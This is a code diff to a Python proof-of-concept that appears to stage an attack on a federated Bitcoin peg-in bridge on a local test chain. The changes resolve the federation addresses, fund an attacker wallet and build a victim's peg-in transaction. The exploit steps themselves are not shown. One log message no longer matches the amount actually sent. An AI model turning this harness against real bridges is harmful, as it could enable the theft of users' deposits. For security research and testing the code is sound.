@@ -722,20 +722,31 @@ def stage_attack():
     log("[attack] active   %s" % active)
     log("[attack] retiring %s" % retiring)
 
-    # bitcoind decodes both federation addresses into scriptPubKeys
-    spk_active = bytes.fromhex(btc("validateaddress", [active])["scriptPubKey"])
-    spk_retiring = bytes.fromhex(btc("validateaddress", [retiring])["scriptPubKey"])
+    def address_script(addr):
+        """Both federation addresses are P2SH; bitcoind can hand back the script."""
+        for method in ("getaddressinfo", "validateaddress"):
+            try:
+                info = btc(method, [addr])
+            except Exception:
+                continue
+            spk = info.get("scriptPubKey")
+            if spk:
+                return bytes.fromhex(spk)
+        raise RuntimeError("could not resolve %s to a scriptPubKey" % addr)
+
+    spk_active = address_script(active)
+    spk_retiring = address_script(retiring)
     log("[attack] active scriptPubKey   %s%s" % (spk_active.hex()[:24], "..."))
     log("[attack] retiring scriptPubKey %s%s" % (spk_retiring.hex()[:24], "..."))
 
     # ---- fund the attacker wallet -------------------------------------
     attacker_addr = p2pkh_address(ATTACKER.public_key.format(True))
     if "funding" not in st:
-        btc("sendtoaddress", [attacker_addr, 0.5])
+        btc("sendtoaddress", [attacker_addr, 0.8])
         mine(1)
         log("[attack] funded attacker %s with 0.5 BTC" % attacker_addr)
 
-    unspent = [u for u in btc("listunspent", [1, 9999999, [attacker_addr]]) if u["amount"] > 0.49]
+    unspent = [u for u in btc("listunspent", [1, 9999999, [attacker_addr]]) if u["amount"] > 0.45]
     if not unspent:
         raise RuntimeError("no mature UTXO for the attacker")
     u = unspent[0]
@@ -786,13 +797,17 @@ def stage_attack():
     # ---- the victim: one ordinary, perfectly valid peg-in --------------
     if "victim_txid" not in st:
         vaddr = p2pkh_address(VICTIM.public_key.format(True))
-        btc("sendtoaddress", [vaddr, 0.01])
+        # needs to be strictly larger than VICTIM_PEGIN_SAT + fee, or the change
+        # output would be negative and the transaction could not be built
+        btc("sendtoaddress", [vaddr, 0.05])
         mine(1)
-        vu = [x for x in btc("listunspent", [1, 9999999, [vaddr]]) if x["amount"] > 0.009][0]
+        vu = [x for x in btc("listunspent", [1, 9999999, [vaddr]]) if x["amount"] > 0.04][0]
         v_prev = bytes.fromhex(vu["txid"])[::-1]
         v_script = p2pkh_script(VICTIM.public_key.format(True))
         v_fee = 1_000
         v_change = int(vu["amount"] * 1e8) - VICTIM_PEGIN_SAT - v_fee
+        if v_change <= 0:
+            raise RuntimeError("victim funding too small: change would be %d sat" % v_change)
         v_outs = [(VICTIM_PEGIN_SAT, spk_active), (v_change, v_script)]
         v_raw, v_txid = sign_tx(VICTIM, v_prev, vu["vout"], v_script, v_outs)
         btc("sendrawtransaction", [v_raw.hex()])
